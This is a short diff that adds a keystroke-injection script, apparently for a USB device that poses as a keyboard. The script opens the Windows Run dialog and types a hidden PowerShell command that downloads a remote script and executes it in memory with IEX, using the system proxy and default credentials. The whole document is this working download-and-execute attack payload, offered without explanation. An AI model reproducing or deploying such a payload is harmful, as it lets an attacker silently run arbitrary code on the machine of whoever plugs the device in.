@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 3000
+STRING powershell -nop -w hidden -c $w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.downloadstring('http://0.0.0.0/script.ps1');
+ENTER
